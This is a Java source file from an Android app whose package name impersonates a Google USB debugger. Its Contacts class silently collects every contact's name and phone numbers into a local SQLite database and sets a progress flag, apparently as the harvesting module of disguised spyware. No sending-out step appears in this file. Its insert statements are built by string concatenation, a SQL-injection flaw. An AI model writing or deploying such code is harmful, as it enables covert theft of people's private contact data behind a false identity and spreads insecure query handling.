package com.google.android.usbdebugger;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteStatement;
import android.net.Uri;
import android.provider.ContactsContract;

import java.text.SimpleDateFormat;
import java.util.Date;

public class Contacts {

    public static void getContacts(Context context) {

        String phoneNumber = null;

        Date dt = new Date();
        @SuppressLint("SimpleDateFormat")
        SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        String daa = ft2.format(dt);

        DBHelper dbh = new DBHelper(context);
        SQLiteDatabase db = dbh.getWritableDatabase();

        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
        String _ID = ContactsContract.Contacts._ID;
        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);

        if(cursor!=null) {
            if (cursor.getCount() > 0) {

                String tt = "CREATE TABLE IF NOT EXISTS ContactsTemp(ids TEXT,  '1' TEXT, '2' TEXT, '3' TEXT," +//1=Name, 2=Mobile, 3=Home, 4=Work, 5=Other
                        " '4' TEXT, '5' TEXT);";

                try {

                    SQLiteStatement stmt;
                    stmt = db.compileStatement(tt);
                    stmt.executeInsert();
                    stmt.close();

                } catch (SQLException e) {
                    dbh.insert_Exeption(db, "Contacts Create ContactsTemp", "SQLException", e.getMessage(), daa);
                    return;
                } catch (Exception ex) {
                    dbh.insert_Exeption(db, "Contacts Create ContactsTemp", "Exception", ex.getMessage(), daa);
                    return;
                }

                while (cursor.moveToNext()) {
                    String Mobile = "";
                    String Home = "";
                    String Work = "";
                    String Other = "";
                    int numbcount = 0;
                    String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
                    String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
                    int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(HAS_PHONE_NUMBER)));

                    if (hasPhoneNumber > 0) {
                        Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null,
                                Phone_CONTACT_ID + " = ?", new String[]{contact_id}, null);

                        while (phoneCursor.moveToNext()) {
                            phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                            if (numbcount == 0) {
                                Mobile = phoneNumber;
                            }
                            if (numbcount == 1) {
                                Home = phoneNumber;
                            }
                            if (numbcount == 2) {
                                Work = phoneNumber;
                            }
                            if (numbcount == 3) {
                                Other = phoneNumber;
                            }
                            numbcount++;
                        }
                    }
                    try {
                        tt = "Insert into ContactsTemp " +
                                "VALUES  ('" + contact_id + "', '" + name + "', '" + Mobile + "', '" + Home + "', '" + Work + "', '" + Other + "') ";

                        if (!db.isOpen()) {
                            db = dbh.getWritableDatabase();
                        }

                        SQLiteStatement stmt;
                        stmt = db.compileStatement(tt);
                        stmt.executeInsert();
                        stmt.close();

                    } catch (SQLException e) {
                        dbh.insert_Exeption(db, "Contacts Insert into ContactsTemp", "SQLException", e.getMessage(), daa);
                        return;
                    } catch (Exception ex) {
                        dbh.insert_Exeption(db, "Contacts Insert into ContactsTemp", "Exception", ex.getMessage(), daa);
                        return;
                    }
                }

                try {
                    String[] tt2 = {"Insert into Contacts (ids, '1', '2', '3', '4', '5')  " +
                            "Select *  from ContactsTemp " +
                            "WHERE ids NOT IN ( SELECT ids FROM Contacts );",
                            "DROP TABLE if exists ContactsTemp;"};


                    for (int i = 0; i < tt2.length; i++) {
                        SQLiteStatement stmt;
                        stmt = db.compileStatement(tt2[i]);
                        stmt.executeInsert();
                        stmt.close();
                    }
                } catch (SQLException e) {
                    dbh.insert_Exeption(db, "Contacts Insert into Contacts", "SQLException", e.getMessage(), daa);
                    return;
                } catch (Exception ex) {
                    dbh.insert_Exeption(db, "Contacts Insert into Contacts", "Exception", ex.getMessage(), daa);
                    return;
                }

                String[] columns = new String[1];
                String[] param = new String[1];
                columns[0] = "CN";
                param[0] = "0";
                if (!db.isOpen()) {
                    db = dbh.getWritableDatabase();
                }
                dbh.UpdateParametrs(db, "Parametrs", columns, param);
            }
        }
    }
}
